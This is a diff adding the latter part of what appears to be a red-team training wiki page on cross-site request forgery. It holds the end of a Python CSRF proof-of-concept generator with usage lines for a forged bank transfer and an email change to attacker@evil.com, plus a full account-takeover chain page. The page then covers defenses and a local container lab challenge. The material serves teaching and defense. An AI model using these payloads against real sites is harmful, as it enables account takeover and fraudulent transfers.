+    parser = argparse.ArgumentParser(description=&#39;CSRF PoC Generator&#39;)
+    parser.add_argument(&#39;url&#39;, help=&#39;Target URL (e.g., https://bank.com/transfer)&#39;)
+    parser.add_argument(&#39;params&#39;, nargs=&#39;+&#39;, help=&#39;Parameters as key=value pairs&#39;)
+    parser.add_argument(&#39;-m&#39;, &#39;--method&#39;, default=&#39;post&#39;,
+                        choices=[&#39;get&#39;, &#39;post&#39;, &#39;post_json&#39;, &#39;multipart&#39;],
+                        help=&#39;HTTP method&#39;)
+    parser.add_argument(&#39;-o&#39;, &#39;--output&#39;, help=&#39;Output HTML file&#39;)
+    parser.add_argument(&#39;--no-auto&#39;, action=&#39;store_true&#39;,
+                        help=&#39;Do not auto-submit the form&#39;)
+    args = parser.parse_args()
+
+    params = {}
+    for p in args.params:
+        if &#39;=&#39; in p:
+            k, v = p.split(&#39;=&#39;, 1)
+            params[k] = v
+
+    poc_html = build_csrf_poc(args.url, args.method, params,
+                               auto_submit=not args.no_auto)
+
+    if args.output:
+        with open(args.output, &#39;w&#39;) as f:
+            f.write(poc_html)
+        print(f&#34;PoC written to {args.output}&#34;)
+    else:
+        print(poc_html)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+						</pre>
+						<p>Usage:</p>
+						<pre class="bash">
+# Generate CSRF PoC for bank transfer
+python3 csrf_poc.py &#39;https://bank.com/transfer&#39; to=attacker amount=10000 \
+  -m post -o bank_transfer_poc.html
+
+# GET CSRF (SameSite=Lax bypass)
+python3 csrf_poc.py &#39;https://bank.com/change-email&#39; email=attacker@evil.com \
+  -m get -o email_csrf.html
+
+# JSON CSRF with text/plain
+python3 csrf_poc.py &#39;https://bank.com/api/transfer&#39; to=attacker amount=10000 \
+  -m multipart -o json_csrf.html
+						</pre>
+					</section>
+					<section>
+						<h3 id="csrf-chain-account-takeover">CSRF Chain: Account Takeover</h3>
+						<pre class="plaintext">
+CSRF → Change Email → Trigger Password Reset → Account Compromised
+						</pre>
+						<h4 id="full-chain-poc">Full chain PoC</h4>
+						<pre class="html">
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+// Sequence of CSRF attacks
+async function attack() {
+    // Step 1: Change victim&#39;s email to attacker&#39;s email
+    await fetch(&#39;https://target.com/settings/email&#39;, {
+        method: &#39;POST&#39;,
+        credentials: &#39;include&#39;,
+        headers: { &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39; },
+        body: &#39;email=attacker@evil.com&#39;
+    });
+
+    // Step 2: Add attacker&#39;s phone for 2FA bypass
+    await fetch(&#39;https://target.com/settings/phone&#39;, {
+        method: &#39;POST&#39;,
+        credentials: &#39;include&#39;,
+        headers: { &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39; },
+        body: &#39;phone=+15551234567&#39;
+    });
+
+    // Step 3: Initiate password reset (goes to attacker&#39;s email)
+    await fetch(&#39;https://target.com/forgot-password&#39;, {
+        method: &#39;POST&#39;,
+        credentials: &#39;include&#39;,
+        headers: { &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39; },
+        body: &#39;email=attacker@evil.com&#39;
+    });
+}
+
+attack().then(() =&gt; {
+    document.body.innerHTML = &#39;&lt;h1&gt;Account takeover in progress. Check your email for reset link.&lt;/h1&gt;&#39;;
+});
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+						</pre>
+					</section>
+					<section>
+						<h3 id="defenses">Defenses</h3>
+						<h4 id="synchronizer-token-pattern">Synchronizer Token Pattern</h4>
+						<p>
+							The server embeds a unique, unpredictable token in each form. The token is checked on submission.
+							An attacker cannot guess it and cannot read it cross-origin.
+						</p>
+						<pre class="html">
+&lt;!-- Server generates this form --&gt;
+&lt;form action=&#34;/transfer&#34; method=&#34;POST&#34;&gt;
+    &lt;input type=&#34;hidden&#34; name=&#34;csrf_token&#34; value=&#34;a1b2c3d4e5f6...&#34;&gt;
+    ...
+&lt;/form&gt;
+						</pre>
+						<pre class="python">
+# Flask implementation
+@app.before_request
+def csrf_protect():
+    if request.method in (&#39;POST&#39;, &#39;PUT&#39;, &#39;DELETE&#39;, &#39;PATCH&#39;):
+        token = session.get(&#39;csrf_token&#39;)
+        if not token or token != request.form.get(&#39;csrf_token&#39;):
+            abort(403)
+
+@app.route(&#39;/form&#39;)
+def form():
+    session[&#39;csrf_token&#39;] = secrets.token_hex(32)
+    return render_template(&#39;form.html&#39;, csrf_token=session[&#39;csrf_token&#39;])
+						</pre>
+						<h4 id="samesite-cookies-best-defense">SameSite Cookies (Best Defense)</h4>
+						<pre class="http">
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+						</pre>
+						<p>
+							<code>SameSite=Strict</code>
+							completely prevents
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							. The cookie is never
+							sent on cross-site requests - not for forms, not for navigations, not for AJAX. This is the
+							most effective
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							defense available today.
+						</p>
+						<h4 id="double-submit-cookie">Double Submit Cookie</h4>
+						<p>
+							The server sets a
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							token in a cookie AND requires the same
+							value in a request header/body. The attacker can't read the cookie cross-origin, so can't include
+							the matching value.
+						</p>
+						<pre class="javascript">
+// Client reads the cookie value and sends it as a header
+const csrf_cookie = document.cookie.match(/csrf_token=([^;]+)/)[1];
+fetch(&#39;/api/action&#39;, {
+    method: &#39;POST&#39;,
+    headers: { &#39;X-CSRF-Token&#39;: csrf_cookie },
+    credentials: &#39;include&#39;,
+    body: JSON.stringify(data)
+});
+						</pre>
+						<h4 id="custom-headers-preflight-check">Custom Headers & Preflight Check</h4>
+						<p>
+							Requiring a custom header like
+							<code>X-Requested-With: XMLHttpRequest</code>
+							forces a CORS preflight. If
+							the server doesn't allow cross-origin requests, the browser blocks the actual request after
+							the failed preflight.
+						</p>
+						<h4 id="origin-referer-validation">Origin / Referer Validation</h4>
+						<p>
+							Check that the
+							<code>Origin</code>
+							or
+							<code>Referer</code>
+							header matches the application's domain:
+						</p>
+						<pre class="python">
+from urllib.parse import urlparse
+
+ALLOWED_ORIGINS = {&#39;https://bank.com&#39;, &#39;https://www.bank.com&#39;}
+
+def verify_origin(request):
+    origin = request.headers.get(&#39;Origin&#39;)
+    if origin and urlparse(origin).netloc not in {
+        urlparse(o).netloc for o in ALLOWED_ORIGINS}:
+        return False
+    referer = request.headers.get(&#39;Referer&#39;)
+    if referer and urlparse(referer).netloc not in {
+        urlparse(o).netloc for o in ALLOWED_ORIGINS}:
+        return False
+    return True
+						</pre>
+						<h4 id="origin-validation-weakness">Origin Validation Weakness</h4>
+						<p>
+							Some browsers suppress the Referer header (via
+							<code>Referrer-Policy: no-referrer</code>
+							). The Origin
+							header is more reliable but is still nullable for
+							<code>file://</code>
+							and
+							<code>data:</code>
+							documents.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							The container runs a banking application vulnerable to
+							<abbr title="Cross-Site Request Forgery">CSRF</abbr>
+							with
+							several endpoints at different protection levels. Build a proof-of-concept page that transfers
+							money, then change the victim's email through the endpoint that skips token validation on GET.
+						</p>
+						<p><a href="/wiki/articles/redteam/csrf.Containerfile">csrf.Containerfile</a></p>
+						<pre class="bash">
+podman build -t csrf-lab -f csrf.Containerfile .
+podman run -d -p 5000:5000 csrf-lab
+						</pre>
+						<p>
+							The banking app listens on
+							<code>http://localhost:5000</code>
+							and exposes:
+						</p>
+						<ul>
+							<li><code>GET|POST /login</code> - login that sets a session cookie with SameSite=Lax</li>
+							<li><code>GET|POST /transfer</code> - money transfer with no <abbr title="Cross-Site Request Forgery">CSRF</abbr> token</li>
+							<li><code>POST /change-password</code> - password change with a predictable <abbr title="Cross-Site Request Forgery">CSRF</abbr> token</li>
+							<li><code>GET /change-email</code> - email change with no <abbr title="Cross-Site Request Forgery">CSRF</abbr> check on GET</li>
+							<li><code>POST /api/update-email</code> - <abbr title="JavaScript Object Notation">JSON</abbr>  <abbr title="Cross-Site Request Forgery">CSRF</abbr> test endpoint</li>
+							<li><code>POST /secure/transfer</code> - transfer with proper <abbr title="Cross-Site Request Forgery">CSRF</abbr> protection, for comparison</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP - Cross-Site Request Forgery (CSRF)</a> - attack description and defenses</li>
+							<li><a class="icon-website" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP CSRF Prevention Cheat Sheet</a> - synchronizer tokens and SameSite</li>
+							<li><a class="icon-website" href="https://cwe.mitre.org/data/definitions/352.html" target="_blank">CWE-352 - Cross-Site Request Forgery</a> - weakness definition</li>
+							<li><a class="icon-website" href="https://datatracker.ietf.org/doc/html/rfc6265" target="_blank">RFC 6265 - HTTP State Management Mechanism</a> - cookie attributes, including SameSite</li>
+							<li><a class="icon-website" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite" target="_blank">MDN - SameSite cookies</a> - browser behavior for Strict, Lax, and None</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
